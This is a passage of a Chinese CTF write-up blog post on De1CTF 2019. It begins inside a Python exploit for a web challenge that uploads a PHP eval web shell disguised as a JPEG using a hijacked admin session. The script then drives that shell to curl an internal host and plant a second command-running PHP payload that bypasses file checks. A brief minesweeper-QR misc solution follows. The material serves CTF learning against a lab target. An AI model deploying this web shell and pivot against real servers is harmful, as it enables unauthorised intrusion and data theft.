class="string">'pic'</span>:(<span class="string">'a2.php'</span>,<span class="string">'&lt;?php @eval($_POST["yue"]);?&gt;'</span>,<span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">    res = requests.post(target + <span class="string">'publish'</span>,files=files,cookies=&#123;<span class="string">'PHPSESSID'</span>:admin_sessionid&#125;)</span><br><span class="line">    shell_url = _action+<span class="string">'upload/a2.php'</span></span><br><span class="line">    <span class="comment"># print(res.text)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'success'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(<span class="string">'[upload]: success!'</span>)</span><br><span class="line">        print(<span class="string">'[shell]: &#123;&#125;'</span>.format(shell_url))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'[upload]: failed! Please check your admin sessionid!'</span>)</span><br><span class="line">        exit(<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> shell_url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    _action = <span class="string">'http://web69.node1.buuoj.cn/'</span></span><br><span class="line">    target = _action + <span class="string">'index.php?action='</span></span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    print(<span class="string">'*'</span> * <span class="number">30</span> + <span class="string">" Username Password "</span> + <span class="string">'*'</span> * <span class="number">30</span>)</span><br><span class="line">    username,password = get_name_and_pwd() <span class="comment">#username=admin&amp;password=jaivypassword</span></span><br><span class="line">    print(<span class="string">'*'</span> * <span class="number">30</span> + <span class="string">" Register "</span> + <span class="string">'*'</span> * <span class="number">30</span>)</span><br><span class="line">    register(username,password)</span><br><span class="line">    print(<span class="string">'*'</span> * <span class="number">30</span> + <span class="string">" Login "</span> + <span class="string">'*'</span> * <span class="number">30</span>)</span><br><span class="line">    login(username,password)</span><br><span class="line">    print(<span class="string">'*'</span> * <span class="number">30</span> + <span class="string">" Publish "</span> + <span class="string">'*'</span> * <span class="number">30</span>)</span><br><span class="line">    admin_sessionid = publish()</span><br><span class="line">    print(<span class="string">'*'</span> * <span class="number">30</span> + <span class="string">" Admin Upload "</span> + <span class="string">'*'</span> * <span class="number">30</span>)</span><br><span class="line">    shell_url = upload(admin_sessionid)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#上传shell2 </span></span><br><span class="line">    <span class="comment"># payload = '''@&lt;?php system("ls /etc") ?&gt;''' //先用这个payload找到flag文件，再用下面的payload读取flag</span></span><br><span class="line">    payload = <span class="string">'''@&lt;?php system("cat /etc/flag_is_He4e_89587236.txt") ?&gt;'''</span></span><br><span class="line">    res_upload = requests.post(target + <span class="string">'publish'</span>,files=&#123;<span class="string">'pic'</span>:(<span class="string">'000.php'</span>,payload,<span class="string">'image/jpeg'</span>)&#125;,cookies=&#123;<span class="string">'PHPSESSID'</span>:admin_sessionid&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 利用shell1在我们能访问的内网上（127.0.0.1）向目标内网传送文件getshell2</span></span><br><span class="line">    <span class="comment">#先传file[1],再传file[0]是为了绕过end(),"file[0]=/../000.php"是为了绕过unlink</span></span><br><span class="line">    curl = <span class="string">'''curl http://172.16.54.2 -F "file=@/var/www/html/upload/000.php" -F "file[1]=111" -F "file[0]=/../000.php" -F "hello=000.php" '''</span></span><br><span class="line">    res = sess.post(shell_url,data=&#123;<span class="string">'yue'</span>:<span class="string">'system("&#123;&#125;");'</span>.format(curl)&#125;)</span><br><span class="line"></span><br><span class="line">    print(res.text)</span><br></pre></td></tr></table></figure>

<p><img src="/2019/09/12/De1CTF-wp/2019-08-13_161420.bmp" alt="2019-08-13_161420"></p>
<p><img src="/2019/09/12/De1CTF-wp/2019-08-16_151855.bmp" alt="2019-08-16_151855"></p>
<p><img src="/2019/09/12/De1CTF-wp/2019-08-16_152246.bmp" alt="2019-08-16_152246"></p>
<p><img src="/2019/09/12/De1CTF-wp/2019-08-16_153621.bmp" alt="2019-08-16_153621"></p>
<p><img src="/2019/09/12/De1CTF-wp/2019-08-16_153706.bmp" alt="2019-08-16_153706"></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Mine-Sweeping"><a href="#Mine-Sweeping" class="headerlink" title="Mine Sweeping"></a>Mine Sweeping</h3><p>附件一个压缩包，下载，是一个扫雷游戏；玩了一下，发现雷的位置是不变的</p>
<p>然后。。。。。然后。。我就建了一个Excel表，把雷的位置都记了下来。。发现是个二维码。。简直心累。。</p>
<p>当然还有更好的解决办法（我还是太菜了o(╥﹏╥)o），以后有时间再去研究吧</p>
<p><img src="/2019/09/12/De1CTF-wp/2019-08-05_101938.bmp" alt="2019-08-05_101938"></p>
<p>用QR Research扫一下</p>
<p><img src="/2019/09/12/De1CTF-wp/2019-08-05_102146.bmp" alt="2019-08-05_102146"></p>
<p>得到一个链接，点进去就是falg。。</p>
<p><img src="/2019/09/12/De1CTF-wp/2019-08-05_102600.bmp" alt="2019-08-05_102600"></p>
<p>参考链接：<a href="https://www.zhaoj.in/read-6170.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6170.html</a> （大佬的很详细哦~，而且web挺全的）</p>
<p>推荐一个靶场：<a href="https://buuoj.cn/login?next=%2Fchallenges%3F" target="_blank" rel="noopener">https://buuoj.cn/login?next=%2Fchallenges%3F</a> （上面那位大佬维护的，很多题目都有在里面复现，web方向可能会全一点（大佬专web），可以在里面好好玩(๑′ᴗ‵๑) ）</p>
</div><div class="post-copyright"><blockquote><p>Ursprünglicher Autor: 悦昕_o</p><p>Ursprünglicher Link: <a href="https://leonardo-o1.github.io/2019/09/12/De1CTF-wp/">https://leonardo-o1.github.io/2019/09/12/De1CTF-wp/</a></p><p>Copyright-Erklärung: Bitte geben Sie die Quelle des Nachdrucks an.</p></blockquote></div><div class="tags"><a href="/tags/wp/">wp</a><a href="/tags/ctf/">ctf</a></div><div class="post-share"><div class="social-share"><span>Aktie:</span></div></div><div class="post-nav"><a href="/2020/07/26/ueditor-1-4-3-3-net版-任意文件上传漏洞分析与复现/" class="pre">ueditor 1.4.3.3 .net版 任意文件上传漏洞分析与复现</a><a href="/2019/09/10/点击劫持/" class="next">点击劫持</a></div><div id="comments"></div></div></div></div><div class="layout-r"><div id="sidebar"><div class="search-pla"></div><div id="toc" class="widget"><div class="widget-title"><i class="fa fa-fei">Inhalte</i></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-Me"><span class="toc-text">SSRF Me</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellshellshell"><span class="toc-text">shellshellshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Mine-Sweeping"><span class="toc-text">Mine Sweeping</span></a></li></ol></li></ol></div><div class="widget"><div class="widget-title"><i class="fa fa-xie"> Letzte</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/05/28/记一次反射型xss绕waf/">记一次反射型xss绕waf</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/05/记录-python模块注入bypass/">记录-python模块注入bypass</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/26/ueditor-1-4-3-3-net版-任意文件上传漏洞分析与复现/">ueditor 1.4.3.3 .net版 任意文件上传漏洞分析与复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/12/De1CTF-wp/">De1CTF部分wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/10/点击劫持/">点击劫持</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/19/第一篇博客/">第一篇博客</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-gui"> Kategorien</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/">ctf</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂记/">杂记</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞学习/">漏洞学习</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞学习/复现/">复现</a><span class="category-list-count">1</span></li></ul></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-biao"> Tags</i></div><div class="tagcloud"><a href="/tags/web漏洞/" style="font-size: 15px;">web漏洞</a> <a href="/tags/xss/" style="font-size: 15px;">xss</a> <a href="/tags/记录/" style="font-size: 15px;">记录</a> <a href="/tags/wp/" style="font-size: 15px;">wp</a> <a href="/tags/ctf/" style="font-size: 15px;">ctf</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-archive"> Archiv</i></div><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li></ul></div></div></div></div><a id="totop" href="#top"></a><div id="footer"><div class="footer-info"><p><a href="/baidusitemap.xml">Sitemap</a> |  <a href="/atom.xml">Abonnieren Sie diese Site</a> |  <a href="/about/">Kontaktieren Sie den Blogger</a></p><p>本站总访问量：<i id="busuanzi_container_site_pv"><i id="busuanzi_value_site_pv"></i></i>次，本站总访客数:<i id="busuanzi_container_site_uv"><i id="busuanzi_value_site_uv"></i></i>人</p><p><span> Copyright &copy;<a href="/." rel="nofollow">悦昕_o.</a></span><span> Theme by<a rel="nofollow" target="_blank" href="https://github.com/chaooo/hexo-theme-BlueLake"> BlueLake.</a></span><span> Count by<a href="http://busuanzi.ibruce.info/"> busuanzi.</a></span><span> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a></span></p></div></div></div><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script type="text/javascript" src="/js/search.json.js?v=2.0.3"></script><script type="text/javascript" src="/js/toctotop.js?v=2.0.3" async></script><link rel="stylesheet" type="text/css" href="/share/css/share.css"><script type="text/javascript" src="/share/js/social-share.js" charset="utf-8"></script><script type="text/javascript" src="/share/js/qrcode.js" charset="utf-8"></script></body></html>